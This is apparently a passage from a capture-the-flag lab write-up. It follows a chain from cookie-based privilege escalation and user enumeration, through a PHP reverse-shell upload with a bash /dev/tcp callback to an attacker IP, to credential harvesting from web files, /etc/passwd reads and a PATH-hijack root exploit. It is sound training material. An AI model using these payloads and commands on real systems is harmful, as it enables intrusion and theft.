4) Access Control Weakness  

This phase focused on analyzing how the application handled session data and access control. 

Cookie Analysis 

Session cookies were reviewed after guest authentication. The application stored role and user identifiers client-side, including values such as role=guest and user=2233. 

![Guest Cookies](images/guest-cookies.png) 
User Enumeration 

The application exposed user identifiers through the id parameter in the admin panel. Modifying this value allowed the enumeration of other users and revealed the administrator account identifier. 

http://10.129.143.127/cdn-cgi/login/admin.php?content=accounts&id=2 

![User Enumeration](images/user-enumeration.png) 
*note= the ip changed here from 10.129.142.60 to 10.129.143.127 because I turned off the machine and then restarted it on again.  

Privilege Escalation to Admin 

By modifying the session cookies from guest to admin values, administrative functionality became accessible, including the upload panel. 

![Admin Access](images/admin-access.png) 
5) Foothold (Initial Access) 

This phase focused on abusing the administrative upload functionality to gain remote code execution. 

File Upload Abuse: Administrative access exposed a file upload feature that accepted user-controlled files.  

This functionality was used to upload a PHP reverse shell to the target. 

Payload Used: 
?php 
system("bash -c 'bash -i >& /dev/tcp/10.10.15.27/4444 0>&1'"); 
?> 
Upload panel:  

 

![Upload Panel](images/shell upload-panel.png)
Reverse Shell Delivery: After uploading, the file location was identified under /uploads/ and the payload was triggered through the browser. The upload path was inferred logically and later confirmed through Gobuster enumeration. 

 

Command:  gobuster dir --url http://{TARGET_IP}/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php 

Before triggering the payload, a Netcat listener was started locally to receive the incoming reverse shell connection. 

Command: nc -lvnp 4444 

Once the uploaded PHP payload was executed, the target initiated a connection back to the listener and returned an interactive shell as www-data 

![Reverse Shell](images/reverse-shell.png)
Initial Shell Access 

Triggering the uploaded payload returned command execution on the target as the www-data user, establishing initial access to the system and enabling post-exploitation enumeration. 

 

6) Post-Exploitation Enumeration 

Post-exploitation focused on stabilizing the shell, enumerating application files, and identifying opportunities for lateral movement. 

Shell Stabilization: The initial reverse shell was upgraded to a fully interactive TTY to improve command execution and enable normal shell interaction. Command: python3 -c 'import pty; pty.spawn("/bin/bash")' 

Credential Discovery: Application files under the web root were reviewed for sensitive information. During enumeration, credentials were identified within application source files, revealing reusable authentication material. But they did not work. 

Command: cat * | grep -i passw* from (/var/www/html/cdn-cgi/login) 

![Credential Discovery](images/credential-discovery.png) 
C)Local User Enumeration: System users were reviewed to identify valid local accounts for lateral movement.                          Command: cat /etc/passwd  

D)Pivot to Robert: Initial credentials were not directly reusable for local access, Further review of db.php revealed valid credentials for lateral movement.                 Command: cat db.php  

 

![dp.php file](images/dp.phpfile.png) 
![Robert Shell](images/robert-shell.png) 
7) Privilege Escalation 

Privilege escalation focused on identifying local misconfigurations that could be abused to obtain root access. 

Privilege Context Enumeration 

let's check the basic commands for elevating privileges like( sudo –l) and (id): 

![elevating privileges](images/elevating-privileges.png) 
the output of id confirmed that the user robert belonged to the bugtracker group, indicating a potential privilege escalation path through group-owned binaries. 

SUID Enumeration 

Further enumeration was performed to identify binaries associated with the bugtracker group. 

Command: find / -group bugtracker 2>/dev/null 

This revealed a binary located at /usr/bin/bugtracker. 

Bugtracker Analysis: The discovered binary was inspected to determine its behavior and execution context. Inspection confirmed that bugtracker was an SUID binary owned by root. 

Command: ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker 
        file /usr/bin/bugtracker 

![Bugtracker SUID](images/bugtracker-suid.png)
There is a suid set on that binary, which is a promising exploitation path. 

      D)    PATH Hijacking: The binary relied on the cat command without using an absolute path, making it vulnerable to PATH hijacking. A malicious cat executable was created in /tmp and used to override the expected system binary. 

Command: echo "/bin/sh" > /tmp/cat 

                         chmod +x /tmp/cat 

                         export PATH=/tmp:$PATH 

E)  Root Access: Executing bugtracker after modifying the PATH variable caused the application to invoke the malicious binary, resulting in a root shell. 

Command: bugtracker 

![Root Shell](images/root-shell.png)
8. Flags 

User flag retrieved from /home/robert/user.txt  

Root flag retrieved from /root/root.txt 

9. Lessons Learned 

Low-severity web flaws can become critical when chained together.  

Client-side trust should never be relied on for authorization.  

Unrestricted file upload can directly lead to remote code execution.  

Application source files often expose credentials useful for post-exploitation.  

SUID binaries should be audited for unsafe execution behavior and PATH abuse.  

